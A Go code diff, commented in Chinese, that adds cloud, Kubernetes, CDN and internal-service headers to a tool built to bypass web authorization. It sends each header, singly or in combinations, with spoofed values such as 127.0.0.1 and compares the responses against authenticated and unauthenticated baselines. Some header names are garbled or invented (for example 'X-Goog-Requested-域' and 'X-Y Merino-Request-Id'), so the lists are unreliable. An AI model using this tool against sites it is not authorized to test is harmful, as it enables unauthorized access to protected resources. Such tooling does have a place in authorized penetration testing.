@@ -64,6 +64,97 @@ var bypassIPHeaders = []string{
 	"X-Referrer",
 }
 
+// bypassCloudHeaders 云平台专有 Header (V2.2 新增)
+// AWS ALB/LB Header
+var bypassAWSHeaders = []string{
+	"X-Amzn-Trace-Id",
+	"X-Forwarded-For-Cloudfront",
+	"X-Amz-Cf-Id",
+	"CloudFront-Viewer-Country",
+	"CloudFront-Is-Desktop-Viewer",
+	"CloudFront-Is-Mobile-Viewer",
+	"CloudFront-Is-SmartTV-Viewer",
+	"CloudFront-Is-Tablet-Viewer",
+	"CloudFront-Forwarded-Proto",
+}
+
+// Azure AD/Application Gateway Header
+var bypassAzureHeaders = []string{
+	"X-MS-Client-Application",
+	"X-MS-Client-Request-Id",
+	"X-MS-Client-Session-Id",
+	"X-MS-Endpoint-Absolute-Path",
+	"X-MS-Forwarded-Client-Cert",
+	"X-MS-Request-Id",
+	"X-MS-EndPoint-Abdolute-Path",
+	"X-AspNet-Version",
+	"X-OWIN-Host",
+	"X-Canary",
+	"X-Arr-Log-Id",
+	"X-Client-IP",
+	"X-Azure-FDID",
+	"X-FD-ErrorOverride",
+}
+
+// GCP Cloud Load Balancing Header
+var bypassGCPHeaders = []string{
+	"X-Goog-Api-Key",
+	"X-Goog-Client",
+	"X-Goog-Credential",
+	"X-Goog-AuthUser",
+	"X-Goog-Requested-域",
+	"X-HTTP-Method-Override",
+	"X-Cloud-Trace-Context",
+	"X-Y Merino-Request-Id",
+}
+
+// K8s Ingress/Service Header
+var bypassK8sHeaders = []string{
+	"X-Forwarded-For-Kubernetes",
+	"X-Real-IP-Kubernetes",
+	"X-Kubernetes-Portal",
+	"X-Kubernetes-Name",
+	"X-Kubernetes-Namespace",
+}
+
+// CDN/DDoS 防护服务扩展头
+var bypassCDNHeaders = []string{
+	// Akamai
+	"X-Akamai-Request-ID",
+	"X-Akamai-Applied-InfRule",
+	"X-Akamai-Not-Send-Triggers",
+	// Imperva Incapsula
+	"X-Cdn-Original-Request",
+	"X-Cdn-Request-Id",
+	"X-Cdn-Resolve-Original-URI",
+	// Cloudflare
+	"CF-Connecting-IP",
+	"CF-IPCountry",
+	"CF-RAY",
+	"CF-Visitor",
+	// Fastly
+	"Fastly-Debug-Geo",
+	"Fastly-FF",
+	"Fastly-Request-ID",
+	// General DDoS
+	"X-DDoS-Type",
+	"X-Engine",
+	"X-Requested-With",
+}
+
+// 内部服务发现 Header (V2.2 新增)
+var bypassInternalHeaders = []string{
+	"X-Internal-Host",
+	"X-Internal-Proxy",
+	"X-Service-Name",
+	"X-Service-Version",
+	"X-Deployment-Id",
+	"X-Pod-Name",
+	"X-Pod-IP",
+	"X-Namespace",
+	"X-Original-Host",
+}
+
 // bypassIPValues 伪造 IP 值（含 IPv6、编码变体、scheme 前缀）
 var bypassIPValues = []string{
 	// 标准 IPv4
@@ -151,8 +242,9 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 
 	// 构建双基线判定上下文
 	ctx := ClassifyContext{
-		Auth:   Baseline{Code: origCode, Len: origLen, Body: sampleBody(body, 8192), Meta: authMeta},
-		NoAuth: noauthBaseline,
+		Auth:           Baseline{Code: origCode, Len: origLen, Body: sampleBody(body, 8192), Meta: authMeta},
+		NoAuth:         noauthBaseline,
+		BaselineTimeMs: authMeta.ResponseTimeMs,
 	}
 
 	var cases []testCase
@@ -266,6 +358,110 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 			url:     url + auth,
 			headers: map[string]string{"User-Agent": ua},
 			desc:    fmt.Sprintf("UserAgent[%s]", truncateStr(ua, 40)),
+		})
+	}
+
+	// 8.1 AWS ALB/LB Header 绕过 (V2.2 新增)
+	for _, awsHeader := range bypassAWSHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{awsHeader: "test-trace-id"},
+			desc:    fmt.Sprintf("AWS[%s]", awsHeader),
+		})
+	}
+	// AWS ALB 组合头测试
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Amzn-Trace-Id":            "Root=1-5759e988-bd862e3fe1be46a994272793",
+			"X-Forwarded-For":            "127.0.0.1",
+			"CloudFront-Forwarded-Proto": "https",
+		},
+		desc: "AWS[ALB combo headers]",
+	})
+
+	// 8.2 Azure AD/Application Gateway Header 绕过 (V2.2 新增)
+	for _, azureHeader := range bypassAzureHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{azureHeader: "test-request-id"},
+			desc:    fmt.Sprintf("Azure[%s]", azureHeader),
+		})
+	}
+	// Azure 组合头测试
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-MS-Client-Application":    "Mozilla/5.0",
+			"X-MS-Forwarded-Client-Cert": "test-cert",
+			"X-Client-IP":                "127.0.0.1",
+		},
+		desc: "Azure[App Gateway combo]",
+	})
+
+	// 8.3 GCP Cloud Load Balancing Header 绕过 (V2.2 新增)
+	for _, gcpHeader := range bypassGCPHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{gcpHeader: "test-gcp-trace"},
+			desc:    fmt.Sprintf("GCP[%s]", gcpHeader),
+		})
+	}
+	// GCP 组合头测试
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Cloud-Trace-Context": "105445AA47/0;o=1",
+			"X-Goog-Api-Key":        "test-api-key",
+			"X-Forwarded-For":       "127.0.0.1",
+		},
+		desc: "GCP[LoadBalancer combo]",
+	})
+
+	// 8.4 K8s Ingress/Service Header 绕过 (V2.2 新增)
+	for _, k8sHeader := range bypassK8sHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{k8sHeader: "127.0.0.1"},
+			desc:    fmt.Sprintf("K8s[%s]", k8sHeader),
+		})
+	}
+	// K8s 组合头测试
+	cases = append(cases, testCase{
+		method: "GET",
+		url:    url + auth,
+		headers: map[string]string{
+			"X-Forwarded-For-Kubernetes": "127.0.0.1",
+			"X-Real-IP-Kubernetes":       "127.0.0.1",
+			"X-Namespace":                "default",
+		},
+		desc: "K8s[Ingress combo]",
+	})
+
+	// 8.5 CDN/DDoS 防护扩展头绕过 (V2.2 新增)
+	for _, cdnHeader := range bypassCDNHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{cdnHeader: "test-cdn-value"},
+			desc:    fmt.Sprintf("CDN[%s]", cdnHeader),
+		})
+	}
+
+	// 8.6 内部服务发现 Header 绕过 (V2.2 新增)
+	for _, internalHeader := range bypassInternalHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{internalHeader: "internal-service"},
+			desc:    fmt.Sprintf("Internal[%s]", internalHeader),
 		})
 	}
 
